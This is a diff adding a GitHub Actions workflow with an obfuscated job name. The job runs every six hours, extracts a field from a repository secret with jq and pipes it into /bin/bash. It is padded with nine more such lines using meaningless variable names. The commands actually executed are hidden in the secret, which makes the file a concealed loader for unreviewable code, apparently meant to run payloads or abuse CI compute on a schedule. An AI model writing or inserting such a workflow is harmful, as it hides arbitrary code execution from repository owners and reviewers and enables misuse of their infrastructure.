@@ -1,0 +1,25 @@
+name: hangzizuoh
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '52 0/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: hangzizuoh
+        env:
+          b1: ${{ secrets.b1 }}
+        run: |
+          echo $b1 | jq -r .gptab36795 | /bin/bash
+          echo $f514 | jq -r .s892 | /bin/bash
+          echo $t5197 | jq -r .g60206 | /bin/bash
+          echo $r0028 | jq -r .vzb44 | /bin/bash
+          echo $zjvm6 | jq -r .kphl24 | /bin/bash
+          echo $iupp08 | jq -r .gbvy296 | /bin/bash
+          echo $h01295 | jq -r .yt8 | /bin/bash
+          echo $hw6659 | jq -r .y1 | /bin/bash
+          echo $q6090 | jq -r .imz73017 | /bin/bash
+          echo $ryv21 | jq -r .a69 | /bin/bash
+
